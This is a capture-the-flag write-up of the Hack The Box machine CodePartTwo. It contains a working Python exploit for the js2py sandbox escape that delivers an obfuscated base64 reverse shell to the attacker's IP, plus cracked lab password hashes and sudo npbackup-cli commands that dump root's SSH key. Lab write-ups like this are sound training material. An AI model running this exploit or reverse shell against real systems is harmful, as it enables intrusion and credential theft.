---
title: CodePartTwo
date: 2025-11-01
description: Easy Linux machine running a Flask-based JavaScript editor vulnerable to js2py sandbox escape (CVE-2024-28397), cracking an exposed SQLite database for SSH access, and abusing a misconfigured npbackup-cli utility for arbitrary file read to gain root.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```bash 
# Nmap 7.95 scan initiated Sat Nov  1 07:30:13 2025 as: /usr/lib/nmap/nmap -p22,8000 -A -oN scan_results.txt 10.10.11.82
Nmap scan report for 10.10.11.82
Host is up (0.40s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8000/tcp)
HOP RTT       ADDRESS
1   461.38 ms 10.10.14.1
2   461.46 ms 10.10.11.82

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  1 07:30:38 2025 -- 1 IP address (1 host up) scanned in 25.19 seconds
```
The web app on port `8000` was a code editor. Source review of `app.py` showed the `/run_code` endpoint used **js2py** to evaluate submitted JavaScript.

# User

## js2py Sandbox Escape

**CVE-2024-28397** provides a sandbox escape for js2py. The payload walks Python object subclasses to locate `subprocess.Popen` and executes a reverse shell:

```python
import requests  
import json  
  
url = 'http://codetwo.htb:8000/run_code'  
  
js_code = """  
let cmd = "printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzMzMzMgMD4mMQ==|base64 -d|bash";  
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;  
let obj = a(a(a,"__class__"), "__base__");  
function findpopen(o) {  
    let result;    for(let i in o.__subclasses__()) {        let item = o.__subclasses__()[i];        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {            return item;        }        if(item.__name__ != "type" && (result = findpopen(item))) {            return result;        }    }}  
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();  
console.log(result);  
result;  
"""  
  
payload = {"code": js_code}  
  
headers = {"Content-Type": "application/json"}  
  
r = requests.post(url, data=json.dumps(payload), headers=headers)  
print(r.text)
```

```bash
python3 payload.py
```

Shell captured on the listener.

## Credential Recovery

System users enumerated:

```text
root:x:0:0:root:/root:/bin/bash
marco:x:1000:1000:marco:/home/marco:/bin/bash 
app:x:1001:1001:,,,:/home/app:/bin/bash
```

An `users.db` SQLite database contained unsalted password hashes:

```text
Username: dante
Password Hash: dad5840ce44580d3a549fa326e104704

Username: mappa
Password Hash: 97588c0e2fa3a024876339e27aeb42e

Username: marco
Password Hash: 649c9d65a206a75f5abe509fe128bce5
```

`marco`'s hash was cracked:

```text
marco : sweetangelbabylove
```

SSH access obtained.

# Root

`sudo -l` revealed `npbackup-cli` running with root privileges:

```bash
sudo npbackup-cli -h

optional arguments:
-c CONFIG_FILE, --config-file CONFIG_FILE
-b, --backup          Run a backup
-f, --force           Force running a backup regardless of existing backups age
--dump DUMP           Dump a specific file to stdout (full path given by --ls), use with --dump [file]
```

The config's `paths:` was modified to `/root` and saved as `new.conf`:

```yaml
repos:
  default:
    repo_uri: ...
    backup_opts:
      paths:
      - /root
      source_type: folder_list
```

## Arbitrary File Read

Triggered a backup, then dumped root's SSH private key:

```bash
sudo npbackup-cli -c new.conf -b -f
```

```bash
sudo npbackup-cli -c new.conf --dump /root/.ssh/id_rsa
```

Gained `root`
